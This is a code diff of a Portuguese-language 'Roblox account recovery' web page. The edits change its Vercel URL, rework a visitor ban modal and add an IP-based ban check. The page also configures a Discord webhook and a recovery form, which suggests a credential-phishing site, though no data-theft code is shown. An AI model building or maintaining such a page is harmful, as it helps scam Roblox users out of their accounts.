@@ -9,7 +9,7 @@
     <meta property="og:title" content="✨ Aurora Premium – Recuperação Roblox" />
     <meta property="og:description" content="Sistema avançado de recuperação de contas Roblox com criptografia militar e suporte 24/7." />
     <meta property="og:image" content="https://i.imgur.com/7hYtLbX.png" />
-    <meta property="og:url" content="https://aurora-main-azure.vercel.app" />
+    <meta property="og:url" content="https://aurora-plum.vercel.app" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
 
@@ -2120,7 +2120,7 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== SCRIPT (TODA A LÓGICA ORIGINAL PRESERVADA) ===== -->
+    <!-- ===== SCRIPT CORRIGIDO ===== -->
     <!-- ============================================================ -->
     <script>
         // ============================================================
@@ -2280,7 +2280,7 @@
         let webhookInfo = { username: 'Aurora Security', avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif' };
 
         // ============================================================
-        // 3. BAN COM GIF
+        // 3. BAN COM GIF - CORRIGIDO
         // ============================================================
         function showBanBlockModal(reason, expires, gif) {
             const modal = document.getElementById('blockModal');
@@ -2292,16 +2292,26 @@
             const gifWrap = document.getElementById('banGifWrap');
             const gifImg = document.getElementById('banGif');
 
-            gifWrap.classList.add('active');
-            gifImg.src = gif || 'https://media.tenor.com/2BpR9fW5HWQAAAAC/roblox-ban.gif';
-            gifImg.alt = 'BANIDO';
+            // ===== MOSTRA O GIF =====
+            if (gif) {
+                gifWrap.classList.add('active');
+                gifImg.src = gif;
+                gifImg.alt = 'BANIDO';
+            } else {
+                gifWrap.classList.remove('active');
+            }
 
+            // ===== TÍTULO =====
             title.className = 'ban-title';
             title.textContent = '🚫 VOCÊ FOI BANIDO!';
             icon.textContent = '⚖️';
-            reasonEl.parentElement.className = 'reason-box ban';
+
+            // ===== MOTIVO =====
+            const reasonBox = document.getElementById('blockReasonBox');
+            reasonBox.className = 'reason-box ban';
             reasonEl.textContent = `🔴 ${reason || 'ATIVIDADE SUSPEITA'}`;
 
+            // ===== DESCRIÇÃO =====
             if (expires) {
                 const date = new Date(expires);
                 desc.innerHTML =
@@ -2320,30 +2330,46 @@
             document.body.style.overflow = 'hidden';
             document.getElementById('recoveryForm').style.display = 'none';
             const sb = document.getElementById('submitBtn');
-            if (sb) { sb.disabled = true;
+            if (sb) {
+                sb.disabled = true;
                 sb.innerHTML = '<i class="fas fa-ban"></i> BLOQUEADO';
                 sb.style.opacity = '0.5';
-                sb.style.cursor = 'not-allowed'; }
+                sb.style.cursor = 'not-allowed';
+            }
         }
 
         // ============================================================
-        // 4. VERIFICA BAN POR IP
+        // 4. VERIFICA BAN POR IP - CORRIGIDO
         // ============================================================
         async function checkBanStatus() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const ip = ipData.ip;
-                const banRes = await fetch(`/api/ban?check=${ip}`);
+                
+                // 🔥 USA A URL COMPLETA
+                const banRes = await fetch(`https://aurora-plum.vercel.app/api/ban?check=${ip}`);
                 const banData = await banRes.json();
+                
+                console.log('🔍 Dados do ban:', banData); // <- DEBUG
+                
                 if (banData.banned) {
                     isUserBanned = true;
-                    showBanBlockModal(banData.reason, banData.expires, banData.gif);
+                    const ban = banData.ban || banData;
+                    // 🔥 PASSA OS DADOS CORRETOS
+                    showBanBlockModal(
+                        ban.reason || 'Motivo não informado',
+                        ban.expires || null,
+                        ban.gif || 'https://media.tenor.com/2BpR9fW5HWQAAAAC/roblox-ban.gif'
+                    );
                     return true;
                 }
                 isUserBanned = false;
                 return false;
-            } catch (e) { return false; }
+            } catch (e) {
+                console.error('❌ Erro ao verificar ban:', e);
+                return false;
+            }
         }
 
         // ============================================================
